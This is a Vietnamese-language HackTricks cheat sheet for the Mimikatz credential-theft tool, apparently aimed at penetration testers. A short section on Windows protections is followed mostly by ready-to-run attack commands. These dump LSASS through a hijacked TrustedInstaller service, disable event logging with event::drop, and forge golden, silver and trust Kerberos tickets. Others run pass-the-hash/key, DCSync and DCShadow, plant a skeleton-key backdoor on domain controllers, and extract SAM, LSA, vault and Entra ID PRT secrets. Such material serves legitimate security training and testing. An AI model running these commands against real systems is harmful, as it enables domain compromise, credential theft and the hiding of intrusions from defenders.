# Mimikatz

{{#include ../../banners/hacktricks-training.md}}


**Trang này dựa trên một bài viết từ [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Hãy xem bản gốc để biết thêm thông tin!<sup>[[3]](#references)</sup>

## LM và Clear-Text trong bộ nhớ

Kể từ Windows 8.1 và Windows Server 2012 R2, các biện pháp đáng kể đã được triển khai để bảo vệ chống đánh cắp thông tin xác thực:

- **LM hashes và mật khẩu dạng văn bản thuần** không còn được lưu trong bộ nhớ nhằm tăng cường bảo mật. Để tắt Digest Authentication, một thiết lập registry cụ thể, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_, phải được cấu hình với giá trị DWORD là `0`, đảm bảo mật khẩu "clear-text" không được lưu trong LSASS.

- **LSA Protection** được giới thiệu để bảo vệ tiến trình Local Security Authority (LSA) khỏi việc đọc bộ nhớ và chèn mã trái phép. Việc này được thực hiện bằng cách đánh dấu LSASS là một tiến trình được bảo vệ. Để kích hoạt LSA Protection:
  1. Sửa đổi registry tại _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ bằng cách đặt `RunAsPPL` thành `dword:00000001`.
  2. Triển khai Group Policy Object (GPO) để áp dụng thay đổi registry này trên các thiết bị được quản lý.

Bất chấp những biện pháp bảo vệ này, các công cụ như Mimikatz có thể vượt qua LSA Protection bằng cách sử dụng các driver cụ thể, dù những hành động như vậy nhiều khả năng sẽ được ghi lại trong nhật ký sự kiện.

Trên các máy trạm hiện đại, điều này càng quan trọng hơn vì **Credential Guard được bật mặc định trên nhiều hệ thống Windows 11 22H2+ và Windows Server 2025 đã tham gia miền, không phải DC**, trong khi **LSASS-as-PPL được bật mặc định trên các bản cài mới Windows 11 22H2+**. Trên thực tế, điều này có nghĩa là `sekurlsa::logonpasswords` thường thu được ít thông tin hơn so với kỳ vọng từ các kỹ thuật cũ; operator ngày càng chuyển sang **offline minidumps**, **trích xuất khóa Kerberos (`sekurlsa::ekeys`)** hoặc **các module hướng đến CloudAP/PRT**. Để tìm hiểu về các biện pháp bảo vệ, xem [Windows credentials protections](credentials-protections.md).

### Đối phó với việc gỡ bỏ SeDebugPrivilege

Quản trị viên thường có SeDebugPrivilege, cho phép họ debug chương trình. Quyền này có thể bị giới hạn để ngăn việc tạo memory dump trái phép, một kỹ thuật phổ biến mà attacker dùng để trích xuất thông tin xác thực từ bộ nhớ. Tuy nhiên, ngay cả khi quyền này bị gỡ bỏ, tài khoản TrustedInstaller vẫn có thể tạo memory dump bằng cách sử dụng cấu hình service tùy chỉnh:

```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```

Điều này cho phép dump bộ nhớ của `lsass.exe` ra tệp, sau đó có thể phân tích tệp này trên một hệ thống khác để trích xuất thông tin đăng nhập:

```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```

## Tùy chọn Mimikatz

Can thiệp nhật ký sự kiện trong Mimikatz gồm hai hành động chính: xóa nhật ký sự kiện và vá dịch vụ Event để ngăn ghi nhật ký các sự kiện mới. Dưới đây là các lệnh thực hiện những thao tác này:

#### Xóa nhật ký sự kiện

- **Lệnh**: Thao tác này nhằm xóa nhật ký sự kiện, khiến việc theo dõi các hoạt động độc hại trở nên khó khăn hơn.
- Mimikatz không cung cấp lệnh trực tiếp trong tài liệu tiêu chuẩn để xóa nhật ký sự kiện qua dòng lệnh. Tuy nhiên, việc thao tác với nhật ký sự kiện thường cần dùng các công cụ hệ thống hoặc script bên ngoài Mimikatz để xóa nhật ký cụ thể (ví dụ: dùng PowerShell hoặc Windows Event Viewer).

#### Tính năng thử nghiệm: Vá dịch vụ Event

- **Lệnh**: `event::drop`
- Lệnh thử nghiệm này được thiết kế để sửa đổi cách hoạt động của Event Logging Service, qua đó ngăn dịch vụ ghi lại các sự kiện mới.
- Ví dụ: `mimikatz "privilege::debug" "event::drop" exit`

- Lệnh `privilege::debug` đảm bảo Mimikatz có đủ quyền cần thiết để sửa đổi các dịch vụ hệ thống.
- Sau đó, lệnh `event::drop` vá dịch vụ Event Logging.

### Tấn công vé Kerberos

Dùng các lệnh bên dưới để tham khảo nhanh cú pháp. Các trang riêng về [golden tickets](../active-directory-methodology/golden-ticket.md), [silver tickets](../active-directory-methodology/silver-ticket.md), [diamond tickets](../active-directory-methodology/diamond-ticket.md) và [over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md) trình bày các chi tiết mới nhất về AES/PAC/opsec.

### Tạo Golden Ticket

Golden Ticket cho phép giả mạo quyền truy cập trên toàn domain. Lệnh và tham số chính:

- Lệnh: `kerberos::golden`
- Tham số:
  - `/domain`: Tên domain.
  - `/sid`: Security Identifier (SID) của domain.
  - `/user`: Tên người dùng cần giả mạo.
  - `/krbtgt`: NTLM hash của tài khoản dịch vụ KDC của domain.
  - `/ptt`: Trực tiếp inject ticket vào bộ nhớ.
  - `/ticket`: Lưu ticket để sử dụng sau này.

Ví dụ:

```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```

### Silver Ticket Creation

Silver Ticket cấp quyền truy cập vào các dịch vụ cụ thể. Lệnh và tham số chính:

- Lệnh: Tương tự Golden Ticket nhưng nhắm vào các dịch vụ cụ thể.
- Tham số:
  - `/service`: Dịch vụ cần nhắm đến (ví dụ: cifs, http).
  - Các tham số khác tương tự Golden Ticket.

Ví dụ:

```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```

### Tạo Trust Ticket

Trust Ticket được dùng để truy cập tài nguyên giữa các domain bằng cách tận dụng các mối quan hệ trust. Các lệnh và tham số chính:

- Command: Tương tự Golden Ticket nhưng dành cho các mối quan hệ trust.
- Parameters:
  - `/target`: FQDN của domain đích.
  - `/rc4`: Hash NTLM của tài khoản trust.

Example:

```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```

### Các lệnh Kerberos bổ sung

- **Listing Tickets**:

  - Command: `kerberos::list`
  - Liệt kê tất cả Kerberos ticket của phiên người dùng hiện tại.

- **Pass the Cache**:

  - Command: `kerberos::ptc`
  - Inject Kerberos ticket từ các file cache.
  - Ví dụ: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Pass the Ticket**:

  - Command: `kerberos::ptt`
  - Cho phép sử dụng Kerberos ticket trong một phiên khác.
  - Ví dụ: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Purge Tickets**:
  - Command: `kerberos::purge`
  - Xóa tất cả Kerberos ticket khỏi phiên.
  - Hữu ích trước khi dùng các lệnh thao túng ticket để tránh xung đột.

### Over-Pass-the-Hash / Pass-the-Key

Nếu `RC4` bị tắt hoặc không đáng tin cậy, Mimikatz có thể patch **khóa Kerberos AES128/AES256** vào phiên đăng nhập hiện tại thay vì chỉ dùng NT hash. Cách này thường phù hợp với các domain hiện đại hơn so với việc xem `sekurlsa::pth` chỉ dành cho NTLM.<sup>[[1]](#references)</sup>

```bash
mimikatz "privilege::debug" "sekurlsa::ekeys" exit
mimikatz "sekurlsa::pth /user:svc_sql /domain:corp.local /aes256:<AES256_HEX> /run:powershell.exe" exit
mimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /impersonate" exit
```

`/impersonate` sử dụng lại tiến trình hiện tại thay vì tạo một console mới, rất hữu ích khi bạn muốn chạy ngay các lệnh như `lsadump::dcsync` trong cùng ngữ cảnh.

### Can thiệp Active Directory

- **DCShadow**: Tạm thời khiến một máy hoạt động như DC để thao tác với đối tượng AD. Xem [DCShadow](../active-directory-methodology/dcshadow.md).

  - `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Giả lập DC để yêu cầu dữ liệu mật khẩu. Xem [DCSync](../active-directory-methodology/dcsync.md).
  - `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Truy cập thông tin xác thực

- **LSADUMP::LSA**: Trích xuất thông tin xác thực từ LSA.

  - `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Giả lập DC bằng dữ liệu mật khẩu của tài khoản máy tính.

  - _Không có lệnh cụ thể cho NetSync trong ngữ cảnh ban đầu._

- **LSADUMP::SAM**: Truy cập cơ sở dữ liệu SAM cục bộ.

  - `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: Giải mã các bí mật được lưu trong registry.

  - `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Đặt NTLM hash mới cho người dùng.

  - `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Truy xuất thông tin xác thực xác thực trust.
  - `mimikatz "lsadump::trust" exit`

### Thông tin xác thực trên cloud / Entra ID

Trên các máy chủ **Entra ID** hoặc **hybrid-joined**, `sekurlsa::cloudap` có thể làm lộ dữ liệu **Primary Refresh Token (PRT)** được lưu trong bộ nhớ đệm của LSASS. Nếu khóa Proof-of-Possession liên quan được bảo vệ bằng phần mềm, `dpapi::cloudapkd` có thể suy ra dữ liệu khóa rõ/đã dẫn xuất cần thiết cho các quy trình **Pass-the-PRT** tiếp theo.<sup>[[1]](#references)</sup>

```bash
mimikatz "privilege::debug" "sekurlsa::cloudap" exit
mimikatz "dpapi::cloudapkd /keyvalue:<ProofOfPossessionKey> /unprotect" exit
mimikatz "dpapi::cloudapkd /context:<CONTEXT> /derivedkey:<DERIVED_KEY> /prt:<PRT>" exit
```

Điều này trở nên khó hơn nhiều khi khóa được TPM bảo vệ, nhưng vẫn đáng kiểm tra trên các endpoint hybrid vì dữ liệu CloudAP được lưu trong cache có thể thú vị hơn kết quả `wdigest` thông thường.<sup>[[2]](#references)</sup> Để xem chuỗi lạm dụng phía cloud, hãy xem [Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html).

### Khác

- **MISC::Skeleton**: Tiêm backdoor vào LSASS trên DC.
  - `mimikatz "privilege::debug" "misc::skeleton" exit`

### Leo thang đặc quyền

- **PRIVILEGE::Backup**: Có được quyền sao lưu.

  - `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Có được đặc quyền debug.
  - `mimikatz "privilege::debug" exit`

### Dump thông tin xác thực

- **SEKURLSA::LogonPasswords**: Hiển thị thông tin xác thực của người dùng đã đăng nhập.

  - `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Trích xuất vé Kerberos từ bộ nhớ.
  - `mimikatz "sekurlsa::tickets /export" exit`

### Thao tác SID và token

- **SID::add/modify**: Thay đổi SID và SIDHistory.

  - Thêm: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
  - Sửa đổi: _Không có lệnh cụ thể để sửa đổi trong ngữ cảnh ban đầu._

- **TOKEN::Elevate**: Mạo danh token.
  - `mimikatz "token::elevate /domainadmin" exit`

### Terminal Services

- **TS::MultiRDP**: Cho phép nhiều phiên RDP.

  - `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: Liệt kê các phiên TS/RDP.
  - _Không có lệnh cụ thể cho TS::Sessions trong ngữ cảnh ban đầu._

### Vault

- Trích xuất mật khẩu từ Windows Vault.
  - `mimikatz "vault::cred /patch" exit`


## References

- [1] [Các công cụ của The Hacker – Các module Mimikatz](https://tools.thehacker.recipes/mimikatz/modules/)
- [2] [Synacktiv – WHFB và Entra ID: Chào đón luồng cache mới của bạn](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)
- [3] [Tài liệu tham khảo lệnh Mimikatz](https://adsecurity.org/?page_id=1821)
{{#include ../../banners/hacktricks-training.md}}
